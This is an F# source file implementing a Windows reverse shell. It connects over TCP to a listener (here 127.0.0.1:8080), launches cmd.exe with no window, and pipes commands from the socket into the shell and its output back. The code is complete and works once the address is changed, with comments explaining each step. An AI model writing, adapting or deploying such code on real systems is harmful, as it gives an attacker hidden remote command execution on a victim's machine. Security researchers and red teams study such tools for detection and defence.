open System
open System.Net
open System.Net.Sockets
open System.Diagnostics
open System.Text




// This function handles reading from the network stream and writing to the cmd process. Asynchronous.
let asyncHandleStream (stream: NetworkStream, cmd: Process) =
    async {
        let buffer = Array.zeroCreate<byte> 4096  // Create a buffer to store data read from the stream

        
        let readCmd = async {
            while true do
                let bytesRead = stream.Read(buffer, 0, buffer.Length)  // Read data from the network stream
                if bytesRead > 0 then
                    let input = Encoding.UTF8.GetString(buffer, 0, bytesRead)  // Convert bytes to string
                    cmd.StandardInput.Write(input)  // Write the input to cmd's standard input
        }

        
        let writeCmd = async {
            let reader = cmd.StandardOutput  // Get cmd's standard output reader
            while not reader.EndOfStream do  // Continue reading until the end of the stream
                let output = reader.ReadLine()  // Read a line of output from cmd
                let outBytes = Encoding.UTF8.GetBytes(output + "\n")  // Convert the output to bytes
                stream.Write(outBytes, 0, outBytes.Length)  // Write the bytes to the network stream
        }

        // Start both async workflows in parallel and ignore their results
        do! Async.Parallel [readCmd; writeCmd] |> Async.Ignore
    }





// Main function to set up the TCP client, start the cmd process, and handle the communication
let main () =
    let client = new TcpClient("127.0.0.1", 8080)  // Create a new TCP client and connect to the server
    let stream = client.GetStream()  // Get the network stream for reading and writing

    // Set up the process start info for cmd.exe
    let procStartInfo = ProcessStartInfo(
        FileName = "cmd.exe",
        RedirectStandardInput = true,  // Redirect standard input so we can write to it
        RedirectStandardOutput = true,  // Redirect standard output so we can read from it
        UseShellExecute = false,  // Do not use the shell to start the process
        CreateNoWindow = true  // Do not create a new window for the process
    )

    let cmd = new Process(StartInfo = procStartInfo)  // Create a new process with the specified start info
    cmd.Start() |> ignore  // Start the cmd process

    // Start handling the communication between the network stream and cmd process
    asyncHandleStream(stream, cmd) |> Async.RunSynchronously

    stream.Flush()  // Ensure all data is sent over the network
    client.Close()  // Close the TCP client and release all associated resources



main()  // Run the main function
